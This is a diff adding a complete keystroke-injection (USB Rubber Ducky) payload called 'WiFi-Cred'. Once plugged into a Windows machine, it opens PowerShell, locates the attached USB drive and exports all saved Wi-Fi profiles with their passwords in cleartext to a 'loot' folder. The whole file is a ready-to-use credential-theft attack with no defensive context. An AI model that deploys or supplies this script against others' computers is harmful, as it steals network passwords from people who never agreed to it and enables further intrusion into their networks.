@@ -1,0 +1,26 @@
+REM Title: WiFi-Cred
+REM Author: tyercel
+REM Based on the code of: SnowMonster
+REM: Version 0.1
+DELAY 2000
+GUI d
+DELAY 150
+GUI r
+DELAY 400
+STRING powershell 
+ENTER
+DELAY 100
+REM searches for USB named DUCK and stores the drive letter in $u
+STRING $u=(gwmi win32_volume -Filter {Label='DUCK'}).Name;
+ENTER
+REM changes to the driveletter of the USB drive and changes to the loot folder
+STRING cd $u
+ENTER
+DELAY 100
+STRING cd \loot
+ENTER
+REM dumps the stored wifi information into the loot folder
+STRING netsh wlan export profile key=clear
+ENTER
+STRING exit
+ENTER
